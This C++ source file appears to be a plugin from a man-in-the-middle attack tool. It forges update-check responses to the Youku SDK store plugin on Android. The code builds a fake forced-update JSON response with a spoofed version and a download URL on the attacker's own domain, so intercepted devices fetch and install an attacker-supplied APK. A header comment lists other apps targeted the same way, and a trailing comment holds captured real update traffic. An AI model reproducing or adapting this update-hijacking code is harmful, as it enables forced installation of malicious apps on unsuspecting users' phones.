#pragma once

//apk -> weixinapk(net and app) meituan youku qqbrowser kugou netease-news stormplayer duomi 2345browser 



#include "YouKuPlugin.h"
#include <windows.h>
#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../HttpUtils.h"


using namespace std;


int YouKuPlugin::prepareRespData(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;
	int curver = 999;
	string strver = "9.9.9";

	//string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;
	string szip = string(MYOWNSITE_ATTACK_DOMAINNAME) + "/" + G_USERNAME;
	

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	//settingid = 2167 9999
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n"
		"Connection: Keep-Alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\"data\":"
		"{\"app\":"
		"{\"appId\":-1,\"versionCode\":\"%u\",\"productId\":\"2015\",\"packageName\":\"com.pp.sdk.apk\",\"versionName\":\"%s\","
		"\"updateDes\":\"youku sdk store plugin version\","
		"\"downloadUrl\":\"http://%s/%s?settingId\\u003d2424\\u0026targetUrl\\u003dhttp%%3A%%2F%%2F%s%%2F%s\\u0026size\\u003d%u\\u0026md5\\u003d%s\","

		"\"updateTime\":%I64u,\"size\":%u,\"isForceUpdate\":1,\"name\":\"\","
		"\"ip\":\"%s\","
		"\"iconUrl\":\"\",\"trailUpdate\":0,\"backgroundImg\":\"\"},\"isNeedUpdate\":1},"
		"\"id\":\"                    \",\"state\":{\"code\":2000000,\"msg\":\"Ok\",\"tips\":\"\"}}";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, curver, strver.c_str(),
		szip.c_str(), filename.c_str(), szip.c_str(), filename.c_str(), m_filesize, m_szmd5,
		//szip.c_str(), filename.c_str(),
		time(0) * 1000, m_filesize, HttpUtils::getIPstr(ulIP).c_str());
	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	return m_iRespSize;
}


//优酷SDK商店插件111版本

//F:\android\apktool\youkuplugin\smali\com\pp\sdk\apk\manager\f
int YouKuPlugin::prepareRespData_old(unsigned long ulIP, string filepath, string filename) {

	int ret = 0;
	int curver = 999;
	string strver = "9.9.9";

	string szip = HttpUtils::getIPstr(ulIP) + "%2F" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: %u\r\n"
		"Connection: Keep-Alive\r\n\r\n%s";
	
	char * lpRespContentFormat =
		"{\"data\":"
		"{\"app\":"
		"{\"appId\":-1,\"versionCode\":\"%u\",\"productId\":\"2015\",\"packageName\":\"com.pp.sdk.apk\",\"versionName\":\"%s\","
		"\"updateDes\":\"youku sdk store plugin version\","
		//"\"downloadUrl\":\"http://%s/%s\","
		"\"downloadUrl\":\"http://%s/%s?settingId\\u003d2167\\u0026targetUrl\\u003dhttp%%3A%%2F%%2F%s%%2F%s\\u0026size\\u003d%u\\u0026md5\\u003d%s\","

		"\"updateTime\":%I64u,\"size\":%u,\"isForceUpdate\":1,\"name\":\"\","
		"\"iconUrl\":\"\",\"trailUpdate\":0,\"backgroundImg\":\"\"},\"isNeedUpdate\":1},"
		"\"id\":\"                        \",\"state\":{\"code\":2000000,\"msg\":\"Ok\",\"tips\":\"\"}}";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,curver,strver.c_str(),
		szip.c_str(), filename.c_str(),szip.c_str(),filename.c_str(), m_filesize, m_szmd5,
		//szip.c_str(), filename.c_str(),
		time(0)*1000, m_filesize);
	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);

	return m_iRespSize;
}



/*
POST /api/op.rec.app.checkUpdate HTTP/1.1
Charset: UTF-8
Content-Type: application/json; charset=utf-8
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: open.sjzs-api.25pp.com
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 337

{"id":-6548837850415480249,"client":{"caller":"secret.pp.client","ex":{"osVersion":23}},"data":{"isp":"",
"versionName":"1.1.1","ch":"PA_15","packageName":"com.pp.sdk.apk","versionCode":111,"productId":2015,"ip":"172.18.192.3",
"updateType":0,"sdkVersionCode":"5","prov":"","net":"wifi","rom":23},"sign":"e37889f901c916ac9ea22ca44924860b"}
HTTP/1.1 200 OK
Date: Sat, 08 Dec 2018 14:57:19 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 110
Connection: keep-alive
Cache-Control: no-cache

{"data":{"app":{},"isNeedUpdate":0},"id":"-6548837850415480249","state":{"code":2000000,"msg":"Ok","tips":""}}


POST /api/resource.app.checkUpdateV1 HTTP/1.1
Charset: UTF-8
Content-Type: application/x-www-form-urlencoded
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: open.sjzs-api.25pp.com
Connection: Keep-Alive
Accept-Encoding: gzip
Content-Length: 5417

HTTP/1.1 200 OK
Date: Sat, 08 Dec 2018 14:57:21 GMT
Content-Type: application/octet-stream
Transfer-Encoding: chunked
Connection: keep-alive
Vary: Accept-Encoding
Cache-Control: no-cache
Content-Encoding: gzip


*/